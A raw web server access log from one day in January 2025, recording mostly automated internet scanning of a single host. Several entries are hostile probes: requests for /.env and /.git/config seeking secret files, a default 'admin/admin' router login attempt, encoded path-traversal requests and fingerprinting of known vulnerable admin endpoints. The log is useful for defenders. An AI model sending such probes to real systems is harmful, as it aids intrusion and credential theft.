147.185.132.182 - - [07/Jan/2025:00:20:10 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
154.213.184.132 - - [07/Jan/2025:00:20:47 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
78.153.140.149 - - [07/Jan/2025:00:22:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [07/Jan/2025:00:22:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [07/Jan/2025:00:28:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
179.43.191.146 - - [07/Jan/2025:00:31:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
175.205.110.27 - - [07/Jan/2025:00:32:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
205.210.31.134 - - [07/Jan/2025:00:45:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.16.39.104 - - [07/Jan/2025:01:04:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.53.198 - - [07/Jan/2025:01:05:18 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
159.223.69.51 - - [07/Jan/2025:01:19:58 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [07/Jan/2025:01:20:08 +0000] "\x16\x03\x01\x01\v\x01" 400 527 "-" "-"
203.69.23.152 - - [07/Jan/2025:01:20:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
117.184.57.30 - - [07/Jan/2025:01:34:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
178.215.236.132 - - [07/Jan/2025:01:36:18 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
95.214.53.198 - - [07/Jan/2025:01:36:29 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
93.174.93.12 - - [07/Jan/2025:01:50:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"
175.203.202.177 - - [07/Jan/2025:01:53:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [07/Jan/2025:02:27:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [07/Jan/2025:02:43:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.147 - - [07/Jan/2025:03:03:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:03:03:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.155 - - [07/Jan/2025:03:08:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
31.13.224.222 - - [07/Jan/2025:03:09:55 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
130.211.108.229 - - [07/Jan/2025:03:57:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
118.33.186.101 - - [07/Jan/2025:04:00:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
210.103.80.94 - - [07/Jan/2025:04:00:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
120.50.65.8 - - [07/Jan/2025:04:03:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
37.79.140.72 - - [07/Jan/2025:04:07:15 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 302 350 "-" "-"
91.223.3.201 - - [07/Jan/2025:04:12:41 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [07/Jan/2025:04:17:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [07/Jan/2025:04:24:24 +0000] "\x16\x03\x02\x01o\x01" 400 527 "-" "-"
78.153.140.147 - - [07/Jan/2025:04:50:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:04:50:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
18.219.13.63 - - [07/Jan/2025:05:09:10 +0000] "\x16\x03\x01" 400 527 "-" "-"
185.189.182.234 - - [07/Jan/2025:05:09:24 +0000] "GET / HTTP/1.1" 400 527 "-" "-"
18.219.13.63 - - [07/Jan/2025:05:09:40 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
195.3.223.55 - - [07/Jan/2025:05:19:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [07/Jan/2025:05:41:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 9; MI 8 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044851 Mobile Safari/537.36 MMWEBID/2901 MicroMessenger/7.0.6.1460(0x2700066A) Process/tools NetType/4G Language/zh_CN"
185.16.39.104 - - [07/Jan/2025:05:50:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.10 - - [07/Jan/2025:05:51:38 +0000] "\x16\x03\x01" 400 527 "-" "-"
198.235.24.10 - - [07/Jan/2025:05:51:38 +0000] "\x16\x03\x01" 400 527 "-" "-"
170.106.181.163 - - [07/Jan/2025:05:57:26 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
112.162.111.140 - - [07/Jan/2025:06:25:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.62.156.119 - - [07/Jan/2025:06:35:48 +0000] "\x16\x03\x01" 400 527 "-" "-"
198.235.24.86 - - [07/Jan/2025:06:48:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.147 - - [07/Jan/2025:06:52:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:06:52:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.180.140.106 - - [07/Jan/2025:07:05:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
110.45.81.116 - - [07/Jan/2025:07:14:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.120.115.119 - - [07/Jan/2025:07:30:45 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.49"
222.120.61.225 - - [07/Jan/2025:07:31:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.226.197.63 - - [07/Jan/2025:07:36:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:37:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:37:26 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:37:27 +0000] "GET /js/NewWindow_2_all.js HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:37:27 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/js/NewWindow_2_all.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:37:27 +0000] "GET /OA_HTML/AppsLocalLogin.jsp HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:37:28 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/OA_HTML/AppsLocalLogin.jsp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:37:56 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:37:56 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:38:21 +0000] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:38:21 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/sitecore/shell/sitecore.version.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:38:49 +0000] "GET /api/session/properties HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:38:49 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/api/session/properties" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:39:14 +0000] "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:39:14 +0000] "HEAD /icons/sphere1.png HTTP/1.1" 200 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:39:15 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:39:15 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:39:16 +0000] "HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:39:17 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:39:17 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/cgi-bin/authLogin.cgi" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
179.43.191.146 - - [07/Jan/2025:07:39:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.226.197.62 - - [07/Jan/2025:07:39:37 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:39:37 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:39:38 +0000] "GET /aspera/faspex/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:39:39 +0000] "GET /webfig/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:39:39 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/webfig/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:40:02 +0000] "GET /license.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:40:02 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/license.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:40:23 +0000] "GET /wp-json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:40:23 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/wp-json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:40:36 +0000] "GET /login.do HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:40:36 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/login.do" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:40:46 +0000] "GET /identity HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:40:46 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/identity" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:40:59 +0000] "GET /cgi-bin/main.pl HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:00 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:00 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/Telerik.Web.UI.WebResource.axd?type=rau" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:07:41:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:07:41:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:07 +0000] "GET /owncloud/status.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
168.76.20.229 - - [07/Jan/2025:07:41:07 +0000] "GET / HTTP/1.1" 200 1798 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:07 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/owncloud/status.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
168.76.20.229 - - [07/Jan/2025:07:41:08 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [07/Jan/2025:07:41:08 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [07/Jan/2025:07:41:08 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/favicon.ico" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [07/Jan/2025:07:41:08 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [07/Jan/2025:07:41:08 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [07/Jan/2025:07:41:08 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
185.226.197.65 - - [07/Jan/2025:07:41:14 +0000] "GET /status.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:14 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/status.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:20 +0000] "GET /console HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:20 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:41:26 +0000] "GET /showLogin.cc HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:41:26 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/showLogin.cc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:41:34 +0000] "GET /solr/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:41:35 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/solr/#/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:41:41 +0000] "GET /admin/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:42 +0000] "GET /zabbix/favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:41:42 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/zabbix/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:41:49 +0000] "GET /sugar_version.json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.64 - - [07/Jan/2025:07:41:49 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/sugar_version.json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:41:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:41:56 +0000] "GET /internal_forms_authentication HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:41:56 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/internal_forms_authentication" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:42:01 +0000] "GET /static/historypage.js HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.62 - - [07/Jan/2025:07:42:01 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/static/historypage.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:42:09 +0000] "GET /WebInterface/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:42:09 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/WebInterface/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
